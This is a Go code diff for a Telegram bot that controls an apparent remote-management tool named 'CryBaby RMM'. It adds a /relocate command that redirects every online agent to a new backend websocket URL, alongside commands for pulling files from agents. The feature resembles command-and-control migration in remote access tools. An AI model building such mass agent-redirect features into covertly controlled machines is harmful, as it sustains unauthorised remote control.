@@ -147,10 +147,13 @@ func (tb *TelegramBot) handleMessage(m *tgbotapi.Message) {
 		tb.cmdBroadcast(m, args)
 	case "/file":
 		tb.cmdFile(m, args)
+	case "/relocate", "/setbackend":
+		tb.cmdRelocate(m, args)
 	default:
 		tb.reply(m, "Unknown command. Use /help to see all available commands.")
 	}
 }
+
 
 func (tb *TelegramBot) cmdHelp(m *tgbotapi.Message, args []string) {
 	helpText := `🤖 CryBaby RMM - by Suzirz
@@ -173,11 +176,39 @@ func (tb *TelegramBot) cmdHelp(m *tgbotapi.Message, args []string) {
 /file UUID PATH - Download file from server
 
 💬 AI Agent:
-Send any message without / to chat with AI!`
+Send any message without / to chat with AI!
+
+🔄 Backend Relocation:
+/relocate ws://IP:PORT/ws - Update backend URL on ALL online agents`
 
 	msg := tgbotapi.NewMessage(m.Chat.ID, helpText)
 	tb.bot.Send(msg)
 }
+
+func (tb *TelegramBot) cmdRelocate(m *tgbotapi.Message, args []string) {
+	if len(args) == 0 {
+		tb.reply(m, "Usage: /relocate ws://IP_BARU:PORT_BARU/ws (or http://...)")
+		return
+	}
+
+	newURL := args[0]
+	if !strings.HasPrefix(newURL, "ws://") && !strings.HasPrefix(newURL, "wss://") {
+		if strings.HasPrefix(newURL, "http://") {
+			newURL = "ws://" + strings.TrimPrefix(newURL, "http://")
+		} else if strings.HasPrefix(newURL, "https://") {
+			newURL = "wss://" + strings.TrimPrefix(newURL, "https://")
+		} else {
+			newURL = "ws://" + newURL
+		}
+	}
+	if !strings.HasSuffix(newURL, "/ws") {
+		newURL = strings.TrimRight(newURL, "/") + "/ws"
+	}
+
+	count := tb.hub.BroadcastUpdateConfig(newURL)
+	tb.reply(m, fmt.Sprintf("✅ Sinyal relocation dikirim ke %d agent online!\nURL Backend Baru: %s", count, newURL))
+}
+
 
 
 func (tb *TelegramBot) reply(m *tgbotapi.Message, text string) {
